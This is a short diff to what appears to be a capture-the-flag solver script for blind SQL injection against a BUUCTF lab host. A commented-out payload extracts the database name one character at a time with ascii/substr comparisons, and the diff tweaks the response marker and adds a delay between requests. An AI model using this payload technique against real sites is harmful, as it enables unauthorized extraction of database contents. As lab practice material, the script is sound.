@@ -5,7 +5,7 @@ import time
 url = 'http://050d49e0-3413-4b9c-804d-94fdf635becb.node4.buuoj.cn:81/search.php?id='
 table=""
 database=""
-flag = "Error"
+flag = "Not this"
 # subs=1
 # while True:
 #     payload = "''or(ascii(substr((database()),{0},1))={1})"
@@ -28,4 +28,5 @@ while True:
             print(table)
             # break
     subs+=1
+    time.sleep(0.05)
 
